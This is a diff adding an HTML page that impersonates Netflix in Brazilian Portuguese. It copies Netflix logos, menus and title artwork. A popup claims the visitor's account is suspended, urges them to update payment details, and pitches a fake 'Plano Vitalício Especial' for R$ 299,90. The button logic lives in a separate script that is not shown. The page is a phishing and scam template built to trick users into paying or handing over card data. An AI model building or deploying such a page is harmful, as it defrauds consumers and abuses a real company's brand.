@@ -1,0 +1,440 @@
+ 
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minha Página</title>
+    <link rel="stylesheet" href="/assets/css/homepage.1d12da84855d38d67e14.css">
+    <link rel="icon" href="/assets/icons/nficon2023.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" href="/assets/icons/nficon2016.png">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <style> 
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);  
+            z-index: 1000; 
+            display: none;  
+        }
+ 
+.message-box {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #ffffffdb;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    font-size: 16px;
+    color: #333;
+    text-align: center;
+    z-index: 2000; 
+    display: none;  
+}
+ 
+.message-content {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+ 
+.icon {
+    margin-bottom: 10px;
+    fill: #ff0000;  
+}
+ 
+.message-text {
+    margin-bottom: 20px;
+}
+ 
+.popup-button {
+    background-color: #ff0000;  
+    color: #fff;  
+    border: none;
+    border-radius: 4px;
+    padding: 10px 20px;
+    cursor: pointer;
+    font-size: 16px;
+    transition: background-color 0.3s ease;
+}
+
+.popup-button:hover {
+    background-color: #cc0000;  
+}
+
+.popup-button:focus {
+    outline: none;
+    box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.5);  
+}
+
+    </style>
+
+    
+</head>
+
+<body>
+<div id="appMountPoint"> 
+       
+<div id="overlay" class="overlay"></div>
+
+    </div>
+
+    
+
+    <div id="message-box" class="message-box" style="display: none; width: 80%; max-width: 600px; margin: auto;">
+    <div class="message-content" style="padding: 20px; box-sizing: border-box;">
+       
+        <div class="message-text">
+            <table align="center" width="100%" cellpadding="0" cellspacing="0">
+                <tbody>
+                    <tr>
+                        <td align="center">
+                            <a href="#">
+                                <img src="https://assets.nflxext.com/us/email/gem/nflx.png" alt="Netflix" width="24" border="0" style="border:none;outline:none;display:block;border-style:none" />
+                            </a>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding-top:25px">
+                            <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#0071eb; border-radius:8px;">
+                                <tbody>
+                                    <tr>
+                                        <td style="padding:15px; background-color:#0071eb; color:#ffffff; font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-size:16px; line-height:22px; text-align:center;">
+                                            Sua conta está suspensa.
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding-left:20px; padding-right:20px;">
+                            <table width="100%" cellpadding="0" cellspacing="0">
+                                <tbody>
+                                    <tr>
+                                        <td style="font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-weight:700; font-size:24px; line-height:30px; letter-spacing:-1px; color:#221f1f; text-align:center;">
+                                            Atualize seus dados de pagamento
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding-top:15px; font-family:NetflixSans-Regular,Helvetica,Roboto,Segoe UI,sans-serif; font-size:14px; color:#221f1f; text-align:center;">
+                                        <div id="userInfo"> 
+                                            <p style="font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-weight:700; font-size:24px; line-height:30px; letter-spacing:-1px; color:#221f1f; text-align:center;" id="nameDisplay">Olá,  </p>
+                                            </div>
+                                          
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding-top:15px; font-family:NetflixSans-Regular,Helvetica,Roboto,Segoe UI,sans-serif; font-size:14px; color:#221f1f; text-align:center;">
+                                            Há um problema com os dados de pagamento atuais. Gostaria de tentar usar o seu cartão de novo? Confira os dados abaixo.
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding-top:15px;">
+                            <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#FFFFFF; border:1px solid #eaeaea; border-radius:8px;">
+                                <tbody>
+                                    <tr>
+                                        <td style="padding:15px;">
+                                            <table width="100%" cellpadding="0" cellspacing="0">
+                                                <tbody>
+                                                    <tr>
+                                                        <td style="font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-weight:700; font-size:12px; color:#221f1f; padding-left:10px; padding-right:10px;">
+                                                            Seu cartão
+                                                        </td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td style="padding-top:5px; font-family:NetflixSans-Regular,Helvetica,Roboto,Segoe UI,sans-serif; font-size:14px; color:#221f1f; padding-left:10px; padding-right:10px;">
+                                                            <table width="100%" cellpadding="0" cellspacing="0">
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td style="padding-right:5px;">
+                                                                            <img src="/assets/img/cartao.png" alt="MASTERCARD" width="50" border="0" style="border:none;outline:none;display:block;" />
+                                                                        </td>
+                                                                        <td>•••• •••• •••• XXXX</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td style="padding-top:10px; font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-weight:700; font-size:12px; color:#221f1f; padding-left:10px; padding-right:10px;">
+                                                            Data de validade (MM/AA)
+                                                        </td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td style="padding-top:5px; font-family:NetflixSans-Regular,Helvetica,Roboto,Segoe UI,sans-serif; font-size:14px; color:#221f1f; padding-left:10px; padding-right:10px;">
+                                                            8/2031
+                                                        </td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </td>
+                    </tr>
+                   
+                    <tr>
+    <td style="padding-top:15px;">
+        <table width="100%" cellpadding="0" cellspacing="0" style="background: linear-gradient(135deg, #0071eb, #00d084); border-radius:8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);">
+            <tbody>
+                <tr>
+                    <td style="padding:20px;">
+                        <table width="100%" cellpadding="0" cellspacing="0">
+                            <tbody>
+                                <tr>
+                                    <td style="font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-weight:700; font-size:18px; color:#ffffff; padding-left:15px; padding-right:15px; text-align:center;">
+                                        **Plano Vitalício Especial!**
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td style="padding-top:10px; font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-size:24px; color:#ffffff; padding-left:15px; padding-right:15px; text-align:center;">
+                                        <strong>Somente R$ 299,90</strong>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td style="padding-top:10px; font-family:NetflixSans-Regular,Helvetica,Roboto,Segoe UI,sans-serif; font-size:14px; color:#ffffff; padding-left:15px; padding-right:15px; text-align:center;">
+                                        Adquira agora e tenha acesso vitalício com benefícios exclusivos e conteúdo ilimitado. Não deixe passar essa oportunidade única!
+                                    </td>
+                                </tr>
+                                <tr>
+                                <td style="padding-top:15px; text-align:center;">
+                                <a id="adquirirBtn" data-payment-id="vitalicia" style="background-color:#ffffff; color:#0071eb; font-family:NetflixSans-Bold,Helvetica,Roboto,Segoe UI,sans-serif; font-size:16px; padding:12px 24px; text-decoration:none; border-radius:6px; font-weight:700; display:inline-block; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); position: relative; overflow: hidden; text-transform: uppercase;">
+    Adquirir
+    <span class="pulsingButton" style="position: absolute; top: 50%; left: 50%; width: 300%; height: 300%; background: rgba(0, 113, 235, 0.2); border-radius: 50%; transform: translate(-50%, -50%); animation: pulse 2s infinite;"></span>
+</a>
+            </td>
+</tr>
+
+                            </tbody>
+                        </table>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </td>
+</tr>
+
+ 
+
+
+
+                </tbody>
+            </table>
+        </div>
+        <button id="atualizarpagamento" data-payment-id="atualizarpagamento" class="popup-button" style="display: block; margin: 20px auto; background-color: #e50914; color: #ffffff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
+    Atualizar Pagamento
+</button>
+
+    </div>
+</div>
+
+
+           
+        </div>
+
+        <div class="column-counter touch-exclusive" dir="ltr">
+            <div class="fallbackSite">
+                <table class="header">
+                    <tbody>
+                        <tr>
+                            <td class="header-item has-inline-left-gutter header-netflix-logo">
+                                <a href="#" class="header-navigation-menu header-navigation-genres">
+                                    <img src="/assets/img/hamburger.gif"
+                                        class="netflix-header-more">
+                                    <div class="header-navigation-slider-background"></div>
+                                    <div class="header-navigation-slider">
+                                        <ol class="navigation-menu-settings">
+                                            <li class="has-inline-left-gutter navigation-menu-profile">
+                                                <img src="https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/vN7bi_My87NPKvsBoib006Llxzg/AAAABaSDR-kTPhPYcVVGSsV0jC3D-Q5HZSFE6fjzAM-4cMpltx1Gw9AV7OTnL8sYnC6CBxOBZQEAJLjStt822uD2lctOvNR05qM.png?r=962"
+                                                    class="header-profile-avatar">
+                                                <p class="navigation-menu-profile-link" data-href="#">
+                                                    <span class="navigation-menu-profile-name" data-href="#">Eu</span>
+                                                    <span class="navigation-menu-profile-text" data-href="#">Trocar de perfil</span>
+                                                </p>
+                                            </li>
+                                            <li class="has-inline-left-gutter navigation-menu-setting" data-href="#">Conta</li>
+                                            <li class="has-inline-left-gutter navigation-menu-setting" data-href="#">Central de Ajuda</li>
+                                            <li class="has-inline-left-gutter navigation-menu-setting" data-href="#">Sair da Netflix</li>
+                                        </ol>
+                                        <ol class="navigation-menu-sections">
+                                            <li class="has-inline-left-gutter-border navigation-menu-section navigation-menu-section-active" data-href="#">Início</li>
+                                            <li class="has-inline-left-gutter-border navigation-menu-section" data-href="#">Minha lista</li>
+                                        </ol>
+                                        <ol class="navigation-menu-genres">
+                                            <li class="has-inline-left-gutter-border navigation-menu-genre" data-href="#">Suspenses</li>
+                                            <li class="has-inline-left-gutter-border navigation-menu-genre" data-href="#">Para toda a família</li>
+                                            <li class="has-inline-left-gutter-border navigation-menu-genre" data-href="#">Filmes e séries estrangeiros</li>
+                                            <li class="has-inline-left-gutter-border navigation-menu-genre" data-href="#">Reality shows</li>
+                                            <li class="has-inline-left-gutter-border navigation-menu-genre" data-href="#">LGBTQ+ Stories</li>
+                                            <li class="has-inline-left-gutter-border navigation-menu-genre" data-href="#">Música e musicais</li>
+                                        </ol>
+                                    </div>
+                                </a>
+                                <a href="#" class="netflix-logo">
+                                    <img src="https://assets.nflxext.com/en_us/layout/ecweb/common/logo-shadow2x.png" class="netflix-logo-image">
+                                </a>
+                                <a href="#" class="header-browse header-navigation-trigger header-has-genres">
+                                    <span class="header-navigation-text">Navegar</span>
+                                    <div class="header-browse-menu header-subnavigation">
+                                        <ol class="browse-menu-sections">
+                                            <li class="browse-menu-section browse-menu-section-active" data-href="#">Início</li>
+                                            <li class="browse-menu-section" data-href="#/my-list">Minha lista</li>
+                                        </ol>
+                                        <ol class="browse-menu-genres">
+                                            <li class="browse-menu-genre" data-href="#">Suspenses</li>
+                                            <li class="browse-menu-genre" data-href="#">Para toda a família</li>
+                                            <li class="browse-menu-genre" data-href="#">Filmes e séries estrangeiros</li>
+                                            <li class="browse-menu-genre" data-href="#">Reality shows</li>
+                                            <li class="browse-menu-genre" data-href="#">LGBTQ+ Stories</li>
+                                            <li class="browse-menu-genre" data-href="#">Anime</li>
+                                            <li class="browse-menu-genre" data-href="#">Ação</li>
+                                            <li class="browse-menu-genre" data-href="#">Comédia</li>
+                                            <li class="browse-menu-genre" data-href="#">Fantasia</li>
+                                            <li class="browse-menu-genre" data-href="#">Ficção científica</li>
+                                            <li class="browse-menu-genre" data-href="#">Terror</li>
+                                            <li class="browse-menu-genre" data-href="#">Comédia stand-up</li>
+                                            <li class="browse-menu-genre" data-href="#">Filmes e séries brasileiros</li>
+                                            <li class="browse-menu-genre" data-href="#">Documentários</li>
+                                            <li class="browse-menu-genre" data-href="#">Música e musicais</li>
+                                            <li class="browse-menu-genre" data-href="#">Romance</li>
+                                            <li class="browse-menu-genre" data-href="#">Dramas</li>
+                                        </ol>
+                                    </div>
+                                </a>
+                                <a href="/ProfilesGate" class="header-kids-menu header-navigation-trigger">
+                                    <span class="header-navigation-text">Infantil</span>
+                                </a>
+                            </td>
+                            <td class="header-item has-inline-right-gutter header-profile-wrapper">
+                                <a href="/ProfilesGate" class="header-profile">
+                                    <img src="https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/vN7bi_My87NPKvsBoib006Llxzg/AAAABaSDR-kTPhPYcVVGSsV0jC3D-Q5HZSFE6fjzAM-4cMpltx1Gw9AV7OTnL8sYnC6CBxOBZQEAJLjStt822uD2lctOvNR05qM.png?r=962"
+                                        class="header-profile-avatar" alt="">
+                                    <span class="header-profile-name">bem vindo</span>
+                                    <div class="header-menu">
+                                        <p class="header-menu-item" data-href="/home.php">Trocar de perfil</p>
+                                        <p class="header-menu-item header-menu-account-item" data-href="/">Conta</p>
+                                        <p class="header-menu-item" data-href="/home.php">Central de Ajuda</p>
+                                        <p class="header-menu-item" data-href="/home.php">Sair da Netflix</p>
+                                    </div>
+                                </a>
+                                <form method="get" action="/search" class="header-search-form">
+                                    <input type="text" name="q" class="header-search-input" placeholder="Buscar">
+                                </form>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div class="body-view">
+                    <div class="lolomo lolomo-standalone">
+                        <div class="single-row-lomo has-inline-left-gutter lomo-scanned">
+                            <h2 class="lomo-name row-name">Minha lista</h2>
+                            <a href="#left" class="is-prev navigation-btn" aria-label="ir para a esquerda" role="button"></a>
+                            <a href="#right" class="is-next navigation-btn" aria-label="ir para a direita" role="button"></a>
+                            <div class="lomo-contents">
+                                <div class="lomo-content">
+                                    <div class="item-outer-wrapper">
+                                        <a  >
+                                            <div class="item-container">
+                                                <img src="https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABWjh7yQl1lGmDOkNCjPp336uPX2crc2CXmipbMqrtcCu-_UCrvtL7L13fhoGFixFCfgD_qSQ7B3Rve0eySbOb9XfbWu93yT1vl8_vN91xzythjOe9Ia1Eo7XfySl_d6gcGgT.jpg?r=ed6"
+                                                    class="item-image">
+                                                <div class="item-overlay"></div>
+                                                <div class="item-title"> </div>
+                                            </div>
+                                        </a>
+                                    </div>
+                                </div> 
+                                </a><a href="#" class="watch-title watch-title-2" data-index="2"
+                                    aria-label="Um Tira da Pesada 4: Axel Foley">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABdOQBkvh6cafRJXm8VjsOUND7s_cxfv0K9s23lPpf22KTCpmOwh1LiJfqB0JaGC2H0h9AeWQnsl3Z6FZ6PSFwoShV4ddPanpK74B6WjWUOJeVj7DrIJQGn-cIyDwabiLb0vVaCl8mIhW5QxSttaHv3GP1mgiWIcJL9cPF1PEQdc1Rmy-Qt2ztuIc1j9NVs4_nCsh4P1UBfjM2G60gMKALY9BMs5zjRrw1rTLYCcpEa6iDoIiXwLDFmPgGxQP_xzFGf2qHjWLAmddMBSDQL2i9WXpZYOAI5GdrIAAhBxZ1iT3d3cB.jpg?r=36f)"
+                                        class="title-boxart"></div><a href="#" class="watch-title watch-title-2" data-index="2"
+                                    aria-label="Um Tira da Pesada 4: Axel Foley">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABdud4Iq8DkyPAzPdU1e9Z2--KwYlm9R3W_nDcP5wBIfx4ACXkhToo3c2IWOM0snFwKxL0BZvjmA0j-UcfkD_SyD0_qgIQvRYkra6W04-MCM_ydPo-Ackpf7M98gaz4WF8-acIrAZKRYlWP8qepZHkaj-DSYopxBruhA3L5eW5BKF5qI4CCpsOmF1cxdCXSgJGk8FZh2a-aFnJ9dw8V_FwzLCIpGb1xxFW6sO0XXtOwe47Dif6hMIXN0l_HWJYTynEeB4dXW5fiJTtT9wB3TlglK-QVye7ydShGf5ZE89_pqsrYAk-gDwQs1uV322PEKjeuXVcO1cr9JRfpVgbAmL6S5jrgT54JKOYzvkXpzd6jo_tweO7f_1fedfbNEwVRwC7Jqx_pKjapWQqX--sPVt-PEMtP2h7ulM3LKf2UP4iq61RCtjNcq62iprC_NIBcNKZMTJ1-dlyqPuMoQ.jpg?r=233)"
+                                        class="title-boxart"></div>
+                                </a> <a href="#" class="watch-title watch-title-31" data-index="31"
+                                    aria-label="A Lição">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABUledtiDwU7vinq1yidjlOAA1h3kuAYZr-TcPxFVwv9aoW6Yo6cRr8g8zutseDgWT72JnaT7tclrTTWRZNP6aMNsxeRpExV24fHWkHWfe6dnkTU2dyZApmv0eo78hUN2lAX-.jpg?r=e59)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-32" data-index="32"
+                                    aria-label="Stranger Things">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABddkzo4VpWNtISwfmK21StGOHJn7eNN1-R2WT5-YSOyzOePPNvSdEnzZ5hnyemxynECRuRavw5UnXPASKlbYX7q2oay6tM0-b2E2dllZwz8plg1lDz_BLO9cod5kXYBsBy3M.jpg?r=92f)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-33" data-index="33"
+                                    aria-label="Café Minamdang">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABZtKXH379Bw3irla_aB6Mi790MOKJXp4p1Q0_V_S04xMKM3HZl6WzIFvlXvsrBqlOYFWJW4nlKCu0H0kQFkCI8LZTrmwHyCljhyWbeX0EBhOn-W_OaOz5V5SFeL--3FdamxL.jpg?r=38b)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-34" data-index="34"
+                                    aria-label="Vida incompleta">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABWf_O2dYKTCSx3pUzDfxNk6VG6N70Fcfv_85hyMiIDWF-vf5QV4hN0GzSW783KzmZUZqz3GbpaCJ4oDbm9gmfDKad9moLjmT6sE.jpg?r=794)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-35" data-index="35"
+                                    aria-label="Rainha Charlotte: Uma História Bridgerton">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABdoJQtTnebbSRC5jnPSUqdU0GMmazaAZAa45Rm2ED0nIL6rU8eA-SUA8t0FkAK-VMwpu4B6AYKWwS7tjwuNUzhhzIhueao97P8CQLmEQPuy5duIei1nrg-WtP-iVglVEM_AN.jpg?r=8dc)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-36" data-index="36"
+                                    aria-label="Pretendente Surpresa">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABcQhi7ZxEr25e1CADAbWxQPJn5NrbWhAvNDUF7GRji5mdZNMLiyc0HB_lFwB166H7H9Ui7PWokgfMSfXM-O6FpYaOPi0Cve4B5Yb_bAdyPbF_1CWhXMFxWK_E_7Okd-_RJj9.jpg?r=4dc)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-37" data-index="37"
+                                    aria-label="Nosso Destino">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABdUF3lyy51com3IxKSAohjm_xlI6QWfVtf3C97--D_vlrBk2yRiRa6mM5pX_4UjXRgcaNQ2CroMAFJ2QdiiNm6i5og30IGi1lyBhnSvWScprCPJd5X37TAyV9gBYGVUnXV7r.jpg?r=403)"
+                                        class="title-boxart"></div>
+
+                                        <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABS7_D24jbwNSWIcO2q8PfQyaqa2dEUTth90JgLaMwaHzso2tGEQ92KcakzFwlaFIs2-tobRyI4anF-W1Jj-DQ_nwAUsCICsbUcKNmGwXkEp2_ceOjqxL2PgvruoJcGOmJewsy1u5IKpI0XjSk_F4zx48-LsYLTFcIU3C3l4mo-zLWQRXNSWkvozo3WhRM0F4MY41VPNtK73FoP5bfjDiFULHooM2_4pStfYDM1U4Pc3oe4dHTH98iSBM8AVo0KJ1QbmxVpgrwjLnbq9D0L-i6RFxbEydQGua0a2qs2rC71Brv6cN.jpg?r=a19)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-2" data-index="2"
+                                    aria-label="O Namorado">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABcl9l2AEd5lwpEClKFdAyPTjC6YY4znSrMeXrckq8WHFbVSA15QbFq3GtV73iGzlG_vo3xy9BcnH2P2SmIyZUy0F8a1BD2WWNlRllp7hrPXC3n-cgsmqVJbm71mgVy10luTiUM4lBH3Q3My3-JS-DVSBcQ-g2GLrtZ5nkFYv2231qsoicyl-w13CnOozMlmZQDENI9s2KQ8PCnDcz1YhbQZ1mroQpanNKZCuwhN_hmuhzk4lQLIeCn-Y0S4945aYlWakqssOwRaEO8QiXaMFKDlqYkV1H3rTUWlkvDAHFJGmXzYZDRc2LNpvrLjdohgsIFBAIW7ghR6Bx21koqEca1779CPBmSwxu_7_XLdn-A_SyRNWeoPm4dQmQxuLwxBHZWrfR5uRstgtkk3Vddiog7n9aaBp0GNv8bochAGkqvDClqLZkgTEjap2ScSOjfAiooMvo3Ex1BIZoQU.jpg?r=483)"
+                                        class="title-boxart"></div>
+                                </a><a href="/title/81323551" class="watch-title watch-title-3" data-index="3"
+                                    aria-label="Caçadores de Demônios">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABaUd1tWuoUHdNJQPIs5HLx83dOdBGCizPBw-uZu93wXPsrEOC_BzV-FCLQqQ5XqluNQs-heqaKDJLA7xBlyZ_d4M_mG8JRnU4xclEJFUV3qbtdPKWlurUyfIlX6zEPsFjpeV.jpg?r=61f)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-4" data-index="4"
+                                    aria-label="Bulgasal: Almas Imortais">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABf9h-7WjxlX3HIDnggUrREp48i5XZWb2eJ_JW0Efb3pdbJF10kywB2krjtHhddg1tMY-YRRAwBn_JCrBUZvAXQ_7w4GsGVBb-ccJKbp-RszFdRWb-sHOm9OQnT0LJ7IdgogU.jpg?r=89a)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-5" data-index="5"
+                                    aria-label="O Mito de Sísifo">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABZ6M8eaqqY9i5vykW8hHlPkJVzNy9G6zFWVqkrStrqMJRNINfwvwAY8kLKiqDAAmYusZXWKcqKNRjbKv0lUMJbDn5s0GPHbFYfDYqEviSJ_VGvedqjJSZZeeXS4nVgABuba7.jpg?r=6b9)"
+                                        class="title-boxart"></div>
+                                </a><a href="#" class="watch-title watch-title-6" data-index="6"
+                                    aria-label="Turbilhão">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABb-Czl7IvDFHYG-dPlcdChORV7zRvrnurjK2SE1EGcd_V0jlKJxVD5rGR7khZbzap04KF2UyGkNKybU5uFZ6ovs9dF9mxFxd-q0LvPeu5xloWK6FQvCiIQYGzZ5x_g4N8NJ9QbqZPhnzwLx3nVXu59ABDftOkRoFz1E0REZbs6Zf0sKrPw_-vO3T6Ar40gHDx91JPTK_IiYCDIQizDPVXZJQEw20apdnegUkQ-U-1FR3RkZXmwF-CxKWwGAje4QicxweyUQwfX06WZUcgn58-ht_bT7OZ7ljDTxSLmKPryfvpPPE.jpg?r=281)"
+                                        class="title-boxart"></div>
+                                </a> <a href="#"
+                                    class="watch-title watch-title-40 has-outline-right-gutter" data-index="40"
+                                    aria-label="Supacell">
+                                    <div style="background-image:url(https://occ-0-3819-3933.1.nflxso.net/dnm/api/v6/Qs00mKCpRvrkl3HZAN5KwEL1kpE/AAAABWjh7yQl1lGmDOkNCjPp336uPX2crc2CXmipbMqrtcCu-_UCrvtL7L13fhoGFixFCfgD_qSQ7B3Rve0eySbOb9XfbWu93yT1vl8_vN91xzythjOe9Ia1Eo7XfySl_d6gcGgT.jpg?r=ed6)"
+                                        class="title-boxart"></div>
+                            </div>
+                           
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> 
+
+    </div>
+        </div>
+    </div>
+   
+  
+
+    <script src="/assets/js/script.js"></script>
+</body>
+
+</html>
